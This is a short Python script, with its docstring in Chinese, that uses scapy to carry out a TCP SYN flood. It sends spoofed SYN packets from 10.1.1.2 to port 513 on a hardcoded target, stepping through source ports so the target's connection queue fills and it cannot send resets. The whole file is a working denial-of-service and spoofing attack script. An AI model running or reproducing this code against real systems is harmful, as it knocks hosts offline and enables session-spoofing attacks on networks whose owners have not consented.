# coding:utf-8

'''
@author = super_fazai
@File    : 基于scapy制造syn泛洪_attack.py
@connect : superonesfazai@gmail.com
'''

"""
原理: 制造一些载有tcp协议层的ip数据包, 让这些包里tcp源端口不断地自增一， 而目标tcp端口总是为513
    运行攻击代码, 发送的tcp syn包将耗尽目标的资源，填满其连接队列，最终达到消除目标发送tcp-reset数据包的能力的目的
"""

from scapy.all import (
    IP,
    TCP,
    send,
    Scapy_Exception,
)

def syn_flood(src, target, target_dport=513):
    for sport in range(1024, 65535):
        try:
            IPlayer = IP(src=src, dst=target)
            TCPlayer = TCP(sport=sport, dport=target_dport)
            pkt = IPlayer/TCPlayer
            send(pkt)
        except Scapy_Exception as e:
            print(e)

src = '10.1.1.2'
target = '192.169.1.3'
syn_flood(src=src, target=target)